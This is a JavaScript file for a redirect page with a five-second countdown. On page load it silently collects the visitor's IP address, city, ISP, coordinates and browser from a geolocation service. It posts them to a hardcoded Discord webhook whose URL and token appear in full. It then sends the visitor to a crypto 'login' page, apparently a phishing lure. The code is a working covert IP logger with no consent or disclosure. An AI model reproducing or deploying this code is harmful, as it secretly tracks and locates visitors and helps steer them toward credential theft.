const countdownElement = document.getElementById('countdown');
let seconds = 5;

// Replace 'YOUR_WEBHOOK_URL' with the actual Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1260616650466525267/FKC6zeKdI_JMg7yjkvMLlgjgARHMH2Q1b8DdYxtBrOABOYTb7p2rY2nkTb2i4enDY0D7';

const deviceName = 'Unknown Device'; // Replace with actual method to get device name
const browserName = navigator.userAgent.split(' ')[0];

// Get user information immediately when the page loads
fetch('https://ipwho.is/')
    .then(response => response.json())
    .then(data => {
        if (!data || !data.success) {
            console.error('Failed to fetch IP data');
            return;
        }

        const message = `
            **User Entered**
            - IP Address: ${data.ip}
            - Country: ${data.country} (${data.country_code})
            - Region: ${data.region}
            - City: ${data.city}
            - ISP: ${data.connection.isp}
            - Latitude: ${data.latitude}
            - Longitude: ${data.longitude}
            - Device Name: ${deviceName}
            - Browser: ${browserName}
        `;

        // Send data to Discord webhook
        sendDataToDiscord(webhookUrl, message);
    })
    .catch(error => {
        console.error('Error fetching IP address:', error);
    });

const intervalId = setInterval(() => {
    countdownElement.textContent = seconds;
    seconds--;

    if (seconds === 0) {
        clearInterval(intervalId);

        // Redirect the user
        window.location.href = 'https://cryptcoin.live/login';
    }
}, 1000); // Update countdown every second

// Function to send data to Discord webhook
function sendDataToDiscord(url, message) {
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: message }),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to send message to Discord');
        }
        console.log('Message sent to Discord:', response);
    })
    .catch(error => {
        console.error('Error sending message to Discord:', error);
    });
}
